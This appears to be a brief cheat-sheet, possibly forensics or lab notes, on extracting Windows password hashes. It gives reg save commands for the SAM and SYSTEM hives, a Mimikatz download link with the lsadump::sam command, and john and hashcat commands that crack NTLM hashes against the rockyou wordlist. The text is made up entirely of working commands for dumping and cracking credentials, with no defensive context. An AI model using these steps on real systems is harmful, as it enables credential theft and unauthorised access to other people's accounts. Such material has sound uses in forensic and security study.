* How to Find windows Passwords

In Windows:
reg save hklm\sam c:\sam
reg save hklm\system c:\system

In Autopsy:
Export sam and system from C:\windows\system32\config

Download Mimikatz from https://github.com/ParrotSec/mimikatz and Open it

Grabbing NTLM Hash:
lsadump::sam /system:path /sam:path
lsadump::sam /system:C:\Users\WHO\Desktop\Autopsy\x\system /sam:C:\Users\WHO\Desktop\Autopsy\x\sam

Cracking Hash:
NTLM : john hash.txt --wordlist=rockyou.txt
NTLM : john --format=NT hash.txt
NTLM : john --wordlist=rockyou.txt --format=NT hash.txt
NTLM : hashcat -m 1000 -a 0 filename rockyou.txt  [1000 = NTLM]
